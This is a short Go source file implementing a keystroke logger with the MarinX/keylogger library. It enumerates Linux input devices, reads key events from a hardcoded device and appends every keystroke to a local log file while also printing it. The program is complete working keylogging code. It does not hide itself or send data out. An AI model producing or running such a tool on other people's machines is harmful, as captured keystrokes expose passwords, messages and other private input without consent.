package main

import (
	"fmt"
	"os"

	"github.com/MarinX/keylogger"
)

const (
	// File for logging.
	filename = "/home/slava/file.log"
)

// Append string to file.
func appendIntoFile(filename, content string) {
	// Chech file exists.
	if _, err := os.Stat(filename); os.IsNotExist(err) {
		// Create file for loggin.
		f, err := os.Create(filename)
		if err != nil {
			panic(err)
		}
		defer f.Close()
	}

	file, err := os.OpenFile(filename, os.O_RDWR|os.O_APPEND, 0755)

	if err != nil {
		panic(err)
	}

	if _, err := file.WriteString(content); err != nil {
		panic(err)
	}

	defer file.Close()
}

func main() {
	devs, err := keylogger.NewDevices()

	if err != nil {
		fmt.Println(err)
		return
	}

	for _, val := range devs {
		fmt.Println("Id->", val.Id, "Device->", val.Name)
	}

	// Keyboard device.
	rd := keylogger.NewKeyLogger(devs[4])

	in, err := rd.Read()
	if err != nil {
		fmt.Println("Error!", err)
		return
	}

	for i := range in {
		if i.Type == keylogger.EV_KEY {
			fmt.Println(i.KeyString() + "\n")
			appendIntoFile(filename, i.KeyString()+"\n")
		}
	}
}
